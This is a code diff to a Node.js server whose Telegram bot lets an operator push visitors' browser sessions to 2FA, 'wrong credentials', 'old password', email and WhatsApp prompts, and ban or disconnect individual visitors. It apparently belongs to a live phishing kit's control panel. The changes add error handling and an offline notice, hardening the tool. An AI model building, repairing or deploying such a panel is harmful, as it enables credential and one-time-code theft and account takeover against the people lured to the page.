@@ -44,7 +44,14 @@ app.use(express.urlencoded({ extended: true }));
 
 if (TELEGRAM_WEBHOOK_URL) {
   app.post('/telegram-webhook', (req, res) => {
-    bot.processUpdate(req.body);
+    try {
+      const body = req.body;
+      if (body && typeof body === 'object') {
+        bot.processUpdate(body);
+      }
+    } catch (err) {
+      console.error('Telegram webhook processUpdate:', err.message);
+    }
     res.sendStatus(200);
   });
 }
@@ -167,36 +174,48 @@ const socketToClient = {};    // socket.id -> clientId
 const newUsers = new Set();
 
 bot.on('callback_query', (query) => {
-  // Answer immediately so Telegram mobile/desktop stops the loading spinner without waiting on I/O
+  if (!query || query.id == null) return;
+
   bot.answerCallbackQuery(query.id).catch(() => {});
 
-  const [command, clientId] = query.data.split(':');
+  try {
+    if (!query.data || typeof query.data !== 'string') return;
+    const colon = query.data.indexOf(':');
+    if (colon < 1) return;
+    const command = query.data.slice(0, colon);
+    const clientId = query.data.slice(colon + 1);
+    if (!clientId) return;
 
-  const map = {
-    send_2fa: 'show-2fa',
-    send_auth: 'show-auth',
-    send_email: 'show-email',
-    send_wh: 'show-whatsapp',
-    send_wrong_creds: 'show-wrong-creds',
-    send_old_pass: 'show-old-pass',
-    send_calendar: 'show-calendar',
-  };
+    const map = {
+      send_2fa: 'show-2fa',
+      send_auth: 'show-auth',
+      send_email: 'show-email',
+      send_wh: 'show-whatsapp',
+      send_wrong_creds: 'show-wrong-creds',
+      send_old_pass: 'show-old-pass',
+      send_calendar: 'show-calendar',
+    };
 
-  if (command === 'disconnect') {
-    disconnectClient(clientId);
-  } else if (map[command]) {
-    emitToClient(clientId, map[command]);
-    const msg = `📩 *Command Sent to Client*\n\n` +
-      `📤 *Command:* \`${command}\`\n` +
-      `🆔 *Client ID:* \`${clientId}\``;
-    sendTelegramMessage(msg, clientId, true);
-  } else if (command === 'ban_ip') {
-    const ip = userData[clientId]?.ip;
-    if (ip) {
-      banIp(ip);
+    if (command === 'disconnect') {
       disconnectClient(clientId);
-      sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
+    } else if (map[command]) {
+      const delivered = emitToClient(clientId, map[command]);
+      const msg =
+        `📩 *Command Sent to Client*\n\n` +
+        `📤 *Command:* \`${command}\`\n` +
+        `🆔 *Client ID:* \`${clientId}\`` +
+        (delivered ? '' : '\n\n⚠️ Client offline — no open browser session for this ID.');
+      sendTelegramMessage(msg, clientId, true);
+    } else if (command === 'ban_ip') {
+      const ip = userData[clientId]?.ip;
+      if (ip) {
+        banIp(ip);
+        disconnectClient(clientId);
+        sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
+      }
     }
+  } catch (err) {
+    console.error('Telegram callback_query:', err.message);
   }
 });
 function formatDateTime(date) {
@@ -496,7 +515,9 @@ function emitToClient(clientId, event, data = null) {
       userData[clientId].action = nextAction;
       updatePanelUsers();
     }
+    return true;
   }
+  return false;
 }
 
 function disconnectClient(clientId) {
